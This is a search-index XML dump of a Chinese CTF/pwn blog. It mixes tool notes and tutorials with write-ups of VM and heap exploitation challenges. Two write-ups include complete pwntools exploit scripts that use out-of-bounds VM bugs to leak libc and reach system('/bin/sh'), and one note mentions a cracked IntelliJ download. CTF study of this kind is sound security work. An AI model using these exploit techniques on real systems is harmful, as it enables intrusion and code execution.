<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>zsh</title><url>/post/tools/zsh/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> https://www.haoyep.com/posts/zsh-config-oh-my-zsh/ chsh -s /usr/bin/zsh失败,将如下命令添加到.bashrc
if [ -t 1 ]; then exec zsh fi</content></entry><entry><title>经验总结</title><url>/post/%E7%AC%94%E8%AE%B0/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"> 在使用GPT帮助写代码的时候，不要发送太长的需求，因为一般需求太长都会导致GPT回答效果变差。要学会分解问题，拆分问题，能够帮自己的目的说明成一个个小问题，这样才能得到更好的回答。</content></entry><entry><title>Linux系统</title><url>/post/%E7%AC%94%E8%AE%B0/linux%E7%B3%BB%E7%BB%9F/</url><categories><category/></categories><tags><tag/></tags><content type="html"> 物理机安装linux系统 用U盘，网上也一堆教程，我使用的是ubuntu24
我第一次装看的这个视频 备份 因为linux很容易死机，所有要及时备份
使用timeshift,这个使用很简单，而且有GUI,直接按照教程用就行，选择备份的地方直接选当前磁盘即可。如果有问题可以直接进入恢复模式，然后进入root shell,然后timeshift &amp;ndash;restore选择要恢复的文件即可
如果连恢复模式都进不了，建议使用livecd</content></entry><entry><title>2025西湖论剑babytrace</title><url>/post/shellcode/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91babytrace/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag/></tags><content type="html"> 中断类型码</content></entry><entry><title>CCBCISCN初赛</title><url>/post/wp%E5%90%88%E9%9B%86/ccbciscn%E5%88%9D%E8%B5%9B/</url><categories><category>WP合集</category></categories><tags><tag/></tags><content type="html"><![CDATA[  novel1 bucket相关知识 在C++中，bucket 通常与哈希表（Hash Table）或无序容器（如 std::unordered_map 和 std::unordered_set）相关。它表示哈希表中的一个存储单元，用于存储具有相同哈希值的元素。
1. 哈希表的基本概念 哈希表是一种数据结构，它通过哈希函数将键（key）映射到一个索引（bucket），然后将值存储在该索引对应的位置。哈希表的核心思想是通过哈希函数将键均匀分布到不同的桶（bucket）中，以实现高效的查找、插入和删除操作。
2. bucket 的作用 bucket 是哈希表中的一个存储单元，通常是一个链表或其他容器（如数组或向量），用于存储具有相同哈希值的元素。
当多个键通过哈希函数映射到同一个索引时，这些键值对会被存储在同一个 bucket 中（这种情况称为哈希冲突）。
哈希表的性能与 bucket 的数量和分布密切相关。如果哈希函数设计得好，元素会均匀分布在各个 bucket 中，从而减少冲突，提高性能。
3. C++ 中的 bucket 相关操作 在 C++ 标准库中，std::unordered_map 和 std::unordered_set 是基于哈希表实现的容器。它们提供了与 bucket 相关的成员函数，例如：
bucket_count(): 返回哈希表中 bucket 的总数。
bucket_size(n): 返回第 n 个 bucket 中的元素数量。
bucket(key): 返回键 key 所在的 bucket 的索引。
load_factor(): 返回哈希表的负载因子（即每个 bucket 的平均元素数量）。
max_load_factor(): 返回或设置哈希表的最大负载因子。
4. 示例代码 以下是一个使用 std::unordered_map 并操作 bucket 的示例：
#include &amp;lt;iostream&amp;gt; #include &amp;lt;unordered_map&amp;gt; int main() { // 创建一个 unordered_map std::unordered_map&amp;lt;std::string, int&amp;gt; myMap = { {&amp;#34;apple&amp;#34;, 1}, {&amp;#34;banana&amp;#34;, 2}, …  ]]></content></entry><entry><title>汇编</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag/></tags><content type="html"> 1. jg（Jump if Greater） 含义: 如果第一个操作数大于第二个操作数，则跳转。
应用场景: 用于有符号数的比较。
条件:
(ZF = 0) 且 (SF = OF) ZF = 0 确保两个数不相等。 SF = OF 表示符号位没有溢出，比较结果有效。 示例:
cmp eax, ebx jg greater_label
2. ja（Jump if Above） 含义: 如果第一个操作数大于第二个操作数，则跳转。
应用场景: 用于无符号数的比较。
条件:
(CF = 0) 且 (ZF = 0) CF = 0 表示第一个操作数没有借位。 ZF = 0 确保两个数不相等。 示例:
cmp eax, ebx ja above_label
3. jl（Jump if Less） 含义: 如果第一个操作数小于第二个操作数，则跳转。
应用场景: 用于有符号数的比较。
条件:
(SF ≠ OF) 符号位和溢出标志不同，表示第一个操作数小于第二个操作数。 示例:
cmp eax, ebx jl less_label
4. jb（Jump if Below） 含义: 如果第一个操作数小于第二个操作数，则跳转。
应用场景: 用于无符号数的比较。
条件:
(CF = 1) 进位标志位被置位，表示第一个操作数小于第二个操作数。 示例:
cmp eax, ebx jb below_label
5. je（Jump if Equal） 含义: 如果两个操作数相等，则跳转。
应用场景: 无论有符号还是无符号比较都适用。
条件:
(ZF = 1) 零标志位被置位，表示比较结果为零（即两个数相等）。 示例:
cmp eax, ebx je equal_label
6. jne（Jump if Not Equal） 含义: 如果两个操作数不相等，则跳转。
应用场景: 无论有符号还是无符号比较都适用。
条件:
(ZF = 0) 零标志位没有置位，表示比较结果非零（即两个数不相等）。 示例:
cmp eax, ebx jne not_equal_label
7. jle（Jump if Less or Equal） 含义: 如果第一个操作数小于或等于第二个操作数，则跳转。
应用场景: 用于有符号数的比较。
条件:
(ZF = 1) 或 (SF ≠ OF) 要么两个数相等，要么符号位和溢出标志不同，表示第一个操作数小于第二个操作数。 示例:
cmp eax, ebx jle less_or_equal_label
8. jbe（Jump if Below or Equal） 含义: 如果第一个操作数小于或等于第二个操作数，则跳转。
应用场景: 用于无符号数的比较。
条件:
(CF = 1) 或 (ZF = 1) 要么借位发生（第一个操作数小于第二个操作数），要么两个数相等。 示例:
cmp eax, ebx jbe below_or_equal_label
总结：有符号 vs. 无符号 指令 有符号 无符号 Greater jg ja Less jl jb Greater or Equal jge jae Less or Equal jle jbe 注意：
有符号指令依赖符号位（SF）和溢出标志（OF）。 无符号指令依赖进位标志（CF）。 这两类指令的用途取决于数据的类型（有符号或无符号），在实际代码中需要根据具体的逻辑需求选择合适的跳转指令。</content></entry><entry><title>强网杯S8决赛qvm</title><url>/post/vm-pwn/%E5%BC%BA%E7%BD%91%E6%9D%AFs8%E5%86%B3%E8%B5%9Bqvm/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"><![CDATA[  本来想分析一下的，但这个题主要难度在于逆向，漏洞点也是在于对寄存器idx检查问题，导致可以越界，最后打通
逆向的过程也是赛博算卦，硬猜硬试打通的
from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * from ctypes import * context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p = process(&#34;/home/zp9080/PWN/pwn&#34;) # p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *$rebase(0x1A8F7)&#39;) # p=remote(&#39;192.168.18.26&#39;,8883) # p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;]) elf = ELF(&#34;/home/zp9080/PWN/pwn&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *$rebase(0xFBE1)&#39;) pause() #mov传参要是10进制 #谁在右边传值给谁 #strlen 1139208 def off2s(value,reg): string=&#39;&#39; off=format(value, &#39;032b&#39;) for i in range(len(off)): if(i==(len(off)-1)): if(off[i]==&#39;0&#39;): pass elif(off[i]==&#39;1&#39;): string+=f&#39;inc {reg}\n&#39; break if(off[i]==&#39;0&#39;): string+=f&#39;mul 2 {reg}\n&#39; elif(off[i]==&#39;1&#39;): string+=f&#39;inc {reg}\nmul 2 {reg}\n&#39; return string code=&#39;&#39;&#39; data 1 &#34;/bin/sh\x00&#34; _start: mov 1139208 0 inc 2 inc 2 &#39;&#39;&#39; code+=off2s(0xA86A0+0x109a00,1) #得到libcbase tmp=&#39;sub 1 0\n&#39; code+=tmp #得到ogg system=0x50900 code+=off2s(system,3) tmp=&#39;add 3 0\n&#39; code+=tmp #写strlen_got tmp=&#39;mov 0 1139208\n&#39; code+=tmp tmp=&#39;ods 1\n&#39; code+=tmp code+=&#39;EOF&#39; # dbg() p.sendlineafter(b&#39;Code :&#39;,code) p.interactive()   ]]></content></entry><entry><title>CCBCISCN初赛avm</title><url>/post/vm-pwn/ccbciscn%E5%88%9D%E8%B5%9Bavm/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"><![CDATA[  逆向分析 逆向出来的结构体如图所示，结构还比较清楚，这里vm实现的是32个寄存器 main函数 vmRun函数，根据code来处理，然后执行func_list中的函数 实现的vm指令如下图所示，这里的add,sub,mul,div,xor,and,shr,shl这些都没有什么问题，漏洞出在load和store指令 漏洞分析 store指令 load指令 主要漏洞在于store和load指令检查时只检查a1-&gt;reg[(v3 &raquo; 5) &amp; 0x1F] + BYTE2(v3),执行指令时却是a1-&gt;reg[(v3 &raquo; 5) &amp; 0x1F] + (HIWORD(v3) &amp; 0xFFF) + a2，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。 from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * from ctypes import * context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p = process(&#34;/home/zp9080/PWN/pwn&#34;) # p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *$rebase(0x1A8F7)&#39;) # p=remote(&#39;47.94.206.103&#39;,30756) # p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;]) elf = ELF(&#34;/home/zp9080/PWN/pwn&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *$rebase(0x1A68)&#39;) pause() #flag{d8523209-6c45-4350-b174-baf2149c9486} pay=b&#39;&#39; def add(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(1)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def sub(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(2)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def shl(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(7)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def shr(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(8)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def load(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(10)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def store(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(9)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def quit(dst,src1,src2): global pay tmp=&#39;&#39; tmp+=bin(11)[2:].zfill(4)+bin(src2)[2:].zfill(12)+&#39;0&#39;*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5) tmp=int(tmp,2) pay+=p32(tmp) def func(value,reg): off=format(value, &#39;032b&#39;) for i in range(len(off)): if(i==(len(off)-1)): if(off[i]==&#39;0&#39;): pass elif(off[i]==&#39;1&#39;): add(reg,reg,13) break if(off[i]==&#39;0&#39;): shl(reg,reg,13) elif(off[i]==&#39;1&#39;): add(reg,reg,13) shl(reg,reg,13) load(12,0,0xdd8) #reg[12]=libc+off load(13,0,0x0003d8) #reg[13]=1 # dbg() func(0x029e40,14) sub(12,12,14) #reg[12]=libcbase add(15,12,15) add(16,12,16) add(17,12,17) add(18,12,18) add(19,12,19) #pop_rdi func(0x2a745,25) add(15,15,25) #binsh bin_addr = 0x1D8678 func(bin_addr,26) add(16,16,26) # #ret # func(0x29139,27) # add(17,17,27) #system system_addr = 0x50D70 func(system_addr,28) add(18,18,28) store(15,31,0x118) store(16,31,0x118+8) store(18,31,0x118+0x18) # dbg() quit(0,0,0) pay+=p32(1) pay=pay.ljust(0x300,b&#39;\x00&#39;) p.sendafter(&#39;opcode&#39;,pay) p.interactive() 由于没有自增，而且本地和远程偏移不同，寄存器初始值都是0， 获取数字1比较困难。最后通过在opcode中自己加入一个1的方式获取，这样的偏移肯定是固定的。
而libc地址的偏移也很奇怪，我试了多个本地能通过的偏移，远程都不行。最后获取栈上最远处的__libc_start_main中的返回地址，终于打通了远程。（要记住千万不要用栈上的ld偏移，本地能通的远程基本都不行，最好是用libc附近的值不要用ld附近的值）
最后打通
  ]]></content></entry><entry><title>2025全国大学生软件创新大赛软件系统安全赛vm</title><url>/post/vm-pwn/2025%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9Bvm/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"><![CDATA[  libc2.35 保护全开
逆向分析 main函数，附件中还有vmdata,vmcode这两个文件，这两个文件是用来初始化vm要执行的代码以及要打印的字符串 readfile函数 handle函数 逆向出来的结构体，这里的uk7,uk8应该是和栈有关，但是我做题时候没用到，也就没有进一步逆向了 handleOp函数，注意下面3个语句,这个&amp;amp;3，说明是取出这个字节的低2位，然后用作为op来进行switch-case的选择。整个函数的作用就是处理code段的代码，然后将相应的参数赋值给s这个缓冲区，再到handle函数中来执行，但要注意每个处理的方式不同因此特别处理。（比如op=0的时候有个for循环，但是实际上我们可以让前两个字节的数都为0，这样移位等于没有，因此只管最后一次循环的值即可）
s-&amp;gt;a1 = *code; s-&amp;gt;a2 = s-&amp;gt;a1 &amp;amp; 3; op = (unsigned __int8)s-&amp;gt;a2; 外面的OP0,OP1,OP2,OP3各有各的作用，它这个vm给的非常全，几乎覆盖了我能想到的所有指令。以OP0为例子.这里的switch-case是根据a2-&amp;gt;a1 &amp;raquo; 2来决定的，其实也就是一个字节的高6位，所以当时过了两个多小时还没有解，出题人给了个四大四小的提示，其实就是对应这个题目的一个自己的高6位和低2位，但当时已经逆向完了 最终逆向出来转换成脚本如下
pay=b&amp;#39;&amp;#39; def op0(op,arg1): global pay op=op&amp;lt;&amp;lt;2 pay+=p8(op)+b&amp;#39;\x00&amp;#39;*2+p8(arg1) def op1(op,arg1): global pay op=op&amp;lt;&amp;lt;2 pay+=p8(op|1)+p8(arg1) def op2(op,arg1,arg2): global pay op=op&amp;lt;&amp;lt;2 pay+=p8(op|2)+p8(arg1)+p8(arg2) def op3(op,arg1,arg2): global pay op=op&amp;lt;&amp;lt;2 pay+=p8(op|3)+p8(arg1)+p8(arg2)+b&amp;#39;\x00&amp;#39;*8 VM攻击分析 VM一般会有如下几种攻击方式：
1.index …  ]]></content></entry><entry><title>Intellij</title><url>/post/tools/intellij/</url><categories><category>Tools</category></categories><tags><tag/></tags><content type="html"> intellij idea下载破解 左上角repair ide可以在更新文件夹内容后刷新ide的加载，使新更新的文件夹出现 快捷键 Top #1智能补全：Ctrl+Shift+Space Top #1自我修复：Alt+Enter Top #1重构一切：Ctrl+Shift+Alt+T</content></entry><entry><title>知识盲区</title><url>/post/%E7%AC%94%E8%AE%B0/%E7%9F%A5%E8%AF%86%E7%9B%B2%E5%8C%BA/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"> 此文章专门记录一些计算机知识盲区，以前从来不知道突然知道了的东西都记录在这里
ctrl+y原来可以反撤回，我一开始一直只知道ctrl+z是撤回，结果还有个反撤回
obsidian可以复制图片到指定文件夹 fn+win键会锁定win键，之前有次把win键锁定了导致无法win+r切出cmd</content></entry><entry><title>编程规范</title><url>/post/%E7%AC%94%E8%AE%B0/%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"> 笔者一直觉得自己的编程不够规范，突然想到准备简单学习一下这种规范
1. 命名规范 命名规范有助于提高代码的可读性和理解性。不同的命名风格有助于区分不同类型的变量、函数、类等。
变量和函数命名：
驼峰命名法（CamelCase）：大多数编程语言都使用驼峰命名法。变量名和函数名从小写字母开始，后续每个单词的首字母大写。 示例：userName, getUserInfo() 下划线命名法（Snake_case）：在变量和函数名称中使用下划线来分隔单词。常见于 Python 等语言。 示例：user_name, get_user_info() 大写命名法（UPPER_CASE）：常用于常量或枚举的命名，所有字母大写，单词之间用下划线分隔。 示例：MAX_SIZE, PI_VALUE 类名命名：
帕斯卡命名法（PascalCase）：类名的每个单词首字母大写，没有下划线。 示例：Person, EmployeeInfo 常量命名：
常量通常使用大写字母，并且单词之间用下划线分隔。 示例：PI, MAX_LENGTH 命名注意事项：
避免使用缩写：除非非常常见（如 URL, HTML），否则避免使用缩写，保证代码的可读性。 有意义的名称：变量名和函数名应清晰表明其用途和功能。 有时候会给函数参数前加上一个下划线，以此来区分是函数参数还是外部全局变量
2. 缩进与格式化 正确的缩进和格式化有助于提高代码的可读性，尤其是当代码变得复杂时。
缩进：
空格 vs 制表符（Tab）：通常推荐使用空格而不是制表符。一个常见的约定是每级缩进使用 2 或 4 个空格。 一致性：无论使用空格还是制表符，保持整个项目一致性至关重要。 行宽：
为了避免代码横向滚动，建议将每行代码的长度限制在 80 到 120 个字符之间。 空格的使用：
操作符前后加空格：操作符（如 =, +, -, *）前后应加空格，增加代码的可读性 int a = 5 + 3; // 正确 int a=5+3; // 错误 逗号后加空格：在列表、函数参数等中，逗号后应加一个空格。 let arr = [1, 2, 3]; // 正确` 换行：在表达式比较长时，可以在合适的位置拆分为多行，保证代码不会过长并保持可读性。 3. 注释 注释是帮助开发人员理解代码的重要工具。良好的注释可以减少维护代码的难度。
函数和方法注释：每个函数和 …</content></entry><entry><title>编程语言笔记</title><url>/post/%E7%AC%94%E8%AE%B0/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"> 随便记录一下各种编程语言中遇到的不知道的一些知识点
python __init__.py 文件的主要作用是将一个目录标识为 Python 包（Package） __pycache__ 是 Python 中用于存储编译字节码文件的目录。每当你导入一个 Python 模块时，Python 会将源代码（.py 文件）编译成字节码（.pyc 文件）并存储在 __pycache__ 目录下，以提高后续执行的效率。 当你定义一个类的方法时，self 是必须的。它允许方法访问实例的属性和其他方法。当你调用该方法时，不需要手动传递 self，Python 会自动将对象本身作为 self 参数传递给方法。</content></entry><entry><title>快捷键</title><url>/post/%E7%AC%94%E8%AE%B0/%E5%BF%AB%E6%8D%B7%E9%94%AE/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"><![CDATA[   这里记录一下windows中选中的快捷键，鼠标点击一次是鼠标光标移动到这里，快速点击两次选中当前鼠标所在位置所有字符（会以&rsquo;/&rsquo;,&rsquo;.&rsquo;,&rsquo;:&lsquo;这种符号分割），快速点击三次就会选中当前行的所有内容 切换到行的开头:Windows/Linux: Home、切换到行的末尾:Windows/Linux: End   ]]></content></entry><entry><title>有关realloc的堆攻击</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E6%9C%89%E5%85%B3realloc%E7%9A%84%E5%A0%86%E6%94%BB%E5%87%BB/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>realloc函数</tag></tags><content type="html"><![CDATA[  通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。
calloc(0x20); //等同于 ptr=malloc(0x20); memset(ptr,0,0x20); 除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。
#include &lt;stdio.h&gt; int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0; } realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作:
当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时
如果申请 size &gt; 原来 size 如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小 如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size) 如果申请 size &lt; 原来 size
如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变 如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分 当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr) 当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作 最主要的就是要知道realloc具有free的功能
  ]]></content></entry><entry><title>2024鹏程杯vm</title><url>/post/vm-pwn/2024%E9%B9%8F%E7%A8%8B%E6%9D%AFvm/</url><categories><category>PWN</category><category>Vm Pwn</category></categories><tags><tag>vm pwn</tag></tags><content type="html"><![CDATA[   记录一下这个vm的复现过程 题目分析 题目是常见的vm类型，这个函数的功能就是初始化mem,a[0]~a[7]是寄存器,a[8]是栈，a[11]是栈大小,a[12]在后面发现是rsp,a[10]在后面发现是rip 题目在到vmrun之前会有个check函数 看到中间有一部分很难逆向，但是发现了magic_number，看出这是md5 同时这个不是硬爆md5,可以看到与magic比较是用strcmp，同时md5这里会有\x00截断，所以只用看截断之前的东西就可以了 最终的check这样通过
check=b&amp;#39;LOGIN:root\nadmin:h3r3_1s_y0u2_G1ft!&amp;amp;&amp;amp;An9q\nDONE&amp;amp;EXIT\n&amp;#39; 题目中还有个sandbox，只让使用open,read,brk,close这几个系统调用，所以得考虑侧信道来爆出flag vmcode逆向内容如下
#reg[idx]/=value def reg_mulvalue(idx,value): global pay pay+=b&amp;#39;\xb8&amp;#39;+b&amp;#39;\x01&amp;#39;+p8(idx)+p64(value) # reg[idx1]/=reg2[idx2]test def div(idx1, idx2): global pay pay += b&amp;#39;\xb8&amp;#39; + b&amp;#39;\x00&amp;#39; + p8(idx1) + p8(idx2) # stack[rsp]=value def pushvalue(value): global pay pay += b&amp;#39;\xb4&amp;#39; + b&amp;#39;\x01&amp;#39; + p64(value) #stack[rsp]=reg[idx] def pushreg(idx): global pay pay+=b&amp;#39;\xb4&amp;#39;+b&amp;#39;\x00&amp;#39;+p8(idx) #ret def popreg(rip): global pay pay+=b&amp;#39;\xb2&amp;#39;+p8(rip) #reg[idx]|=value def reg_orvalue(idx,value): global pay …  ]]></content></entry><entry><title>双写绕过</title><url>/post/web-pwn/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"><![CDATA[   此题是2024鹏城杯 ezupload这道题 第一阶段 题目是很常见的httpd文件，出题人只写了GET和POST两种请求。可以看都GET请求带参数(也就是有?)，POST请求，或者访问的文件具有用户读权限、组执行权限或其他用户执行权限中的任意一个权限，v2 被设置为 1。此时会进入bbbb函数 而serve_file函数其实就是进行一个文件读然后写到输出中，但是想要直接访问flag文件是不行的，因为看到dockerfile中flag具有用户读权限，所以进不到serve_file函数中去
COPY ./flag/flag / RUN chown root:root /flag RUN chmod 744 /flag 相关系统调用 pipe pipe 系统调用用于创建一个单向数据通道，通过文件描述符实现进程间通信。pipe 的语法如下：
#include &amp;lt;unistd.h&amp;gt; int pipe(int pipefd[2]); 参数：pipefd 是一个包含两个整数的数组，pipefd[0] 是读取端，pipefd[1] 是写入端。
向 pipe[1] 写入数据，pipe[0] 就会接收到数据。这是管道在进程间通信中的核心原理。
管道的工作机制:
单向数据流：管道（pipe）创建后会提供两个文件描述符，pipe[0] 和 pipe[1]。 pipe[0] 是读取端。 pipe[1] 是写入端。 数据传递：向 pipe[1] 写入的数据会自动流向 pipe[0]，这样读取端的进程就可以获取写入端写入的数据。数据在进程之间传递时不会经过磁盘，而是直接在内存中传输，这样通信速度更快。
dup2 dup2 是一个系统调用，用于将一个文件描述符复制到另一个文件描述符。它通常用于重定向标准输入、输出和错误。其定义如下：
#include &amp;lt;unistd.h&amp;gt; int dup2(int oldfd, int newfd); oldfd：要复制的文件描述符。newfd：要将 oldfd 复制到的文件描述符。如果 newfd 已经打开，它会首先被关闭，然后指向与 oldfd 相同的文件。
dup2 常用于将标准输入、标准输出或标准错误重定向到一个文件或管道的文件描述符，以便控制输出或输入的来源。例如，将标准输出重定向到一个文件。比如dup2(file_fd, …  ]]></content></entry><entry><title>Test</title><url>/test/</url><categories><category/></categories><tags><tag/></tags><content type="html"></content></entry><entry><title>从rust堆看堆块伪造</title><url>/post/rust-pwn/%E4%BB%8Erust%E5%A0%86%E7%9C%8B%E5%A0%86%E5%9D%97%E4%BC%AA%E9%80%A0/</url><categories><category>PWN</category><category>Rust Pwn</category></categories><tags><tag>rust pwn</tag></tags><content type="html"> 各个函数功能的测试与分析 题目是强网S8的chat_with_me这道题，看似是个菜单堆，但实际上的add看不出来像常规菜单堆的堆块变化。发现add后然后show时会泄露栈上的数据，所以很容易就得到了pie,heapbase,以及stack地址，这一步很容易发现。
发现是这样的一个结构，heapaddr存着的是栈地址，然后show的时候是利用*(heapaddr)这种方式，也就是解引用再找到存储的栈地址，然后进行leak。 然后测试一下edit的功能，可以看到edit函数中限制是0x50，即使我们输入b&amp;amp;rsquo;a&amp;amp;rsquo;*0x50，程序也会崩掉，发现edit的最后有个任意地址的free，我们edit偏移为0x20处的那个地方就是free的地址。 同时发现edit的数据写到栈上后，同时会复制到一个0x2010大小的堆块上，这个堆块比较奇怪，似乎是作为缓冲区。然后多次add会发现多了个0x50大小的堆块(rust中的vec和c++一样，也是利用realloc来扩展堆块)，这个堆块存的数据还比较重要，存的都是一些栈地址，根据前面的分析可以猜出这些存的就是对应idx为0,1,2&amp;amp;hellip;的地址，前面说了show和edit都会通过这个堆地址解引用来确定最终show和edit的地址。所以有了一个思路，如果能控制这些堆上存的指针，那么就有了任意地址的写和任意地址的泄露 堆块的伪造与free 根据前面的思路，我们现在想做的就是控制那些堆地址的指针，前面说了我们可以多次add，然后会申请出0x50大小的堆块，如果这个堆块是我们可控的地址，那不就随便覆盖指针。
哪里可控呢? 当然是刚才说的0x2010大小的堆缓冲区，因为edit时会把数据复制到这个堆缓冲区。所以如果我们可以将其free掉，然后再多次add，那么就可以申请出的0x50的堆块就会从这个unsorted bin中切割获得，那么我们再进行edit，这个0x50大小的堆块存的数据都可以被我们覆盖!!!
如果伪造呢? 可以想想free的过程，再来想要满足哪些条件。
首先会根据被free的堆块的size的inuse位看看前一个堆块是否被free，如果被free那么将会进行与prev_chunk的合并。然后根据其size，利用chunk_header+size寻找下一个堆块，判断next_chunk的size …</content></entry><entry><title>go中的栈溢出</title><url>/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/</url><categories><category>PWN</category><category>Go Pwn</category></categories><tags><tag>go pwn</tag></tags><content type="html"><![CDATA[  自从CISCN过后，又好久没有遇到什么go中的栈溢出了。这次打了强网有个qroute也是go中的栈溢出，借此机会复现这道题同时再做一下之前做过的go的栈溢出，总结一下go中栈溢出应该怎么发现利用
强网杯S8-qroute 此题是参考 ACT的WP复现的 ,在复现的基础上记录一下自己遇到的困难以及如何解决
第一阶段 正常逆向后发现程序有如下功能 cert 4ceb539da109caf8eea7 set dns/set route/set interface set dns primary 8.8.8.8 set route 192.168.1.0/24 gateway 192.168.0.1 set interface eth0 ip 192.168.0.10 netmask 255.255.255.0 show routes/show interfaces/show dns/show logs delete route/delete interface/delete dns $var exec ping host $var exec traceroute $var exit logout 这个cert很好过（和CISCN的shellwego有点像，都是要先cert），直接就看到是个RC4 接下来要做的就是逆向各个功能，但是发现大部分函数都比较正常，在exec ping中发现有个很可疑的地方 go中的string一般会先存在一个比栈还高的地址，可以看到v29是可以根据v71=len不断累加的，然而赋值是个for循环， &amp;amp;v79[v29 + 1 + j]是个栈上的地址，如果长度不合理，那么将覆盖返回地址
在go中，经常会看到这样的结构，buf[i]存的是一个指针，这个指针指向一个字符串，buf[i+1]存的是这个字符串的长度，可以看到v71 = *(_QWORD *)(v28 + 8);也是这种结构
